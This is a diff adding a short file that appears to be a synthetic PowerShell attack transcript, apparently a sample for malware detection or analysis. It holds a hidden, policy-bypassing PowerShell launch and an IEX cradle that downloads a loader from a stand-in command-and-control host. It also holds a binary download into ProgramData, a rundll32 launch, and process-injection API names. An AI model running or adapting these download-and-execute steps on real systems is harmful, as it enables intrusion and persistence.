@@ -1,0 +1,16 @@
+PowerShell Execution Transcript
+Host Application: powershell.exe
+
+Command Sequence:
+powershell.exe -nop -w hidden -ExecutionPolicy Bypass
+IEX (New-Object Net.WebClient).DownloadString('http://example-c2.test/loader.ps1')
+[System.Convert]::FromBase64String('VABlAHMAdAAgAFAAYQB5AGwAbwBhAGQA')
+Invoke-WebRequest -Uri https://cdn-suspicious.test/update.bin -OutFile C:\\ProgramData\\updater.bin
+Start-Process rundll32.exe
+
+API-like strings found in memory snapshot:
+CreateRemoteThread
+VirtualAllocEx
+WriteProcessMemory
+AdjustTokenPrivileges
+SeDebugPrivilege
